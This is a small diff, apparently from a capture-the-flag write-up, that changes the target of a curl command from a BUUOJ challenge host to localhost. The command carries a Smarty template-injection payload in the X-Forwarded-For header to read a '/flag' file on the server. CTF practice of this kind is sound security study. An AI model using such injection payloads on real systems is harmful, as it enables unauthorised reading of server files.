@@ -19,7 +19,7 @@
 
 ```
 curl -X GET \
-  http://web57.buuoj.cn/xff/ \
+  http://127.0.0.1/xff/ \
   -H 'X-Forwarded-For: {include file='\''/flag'\''}'
 ```
 
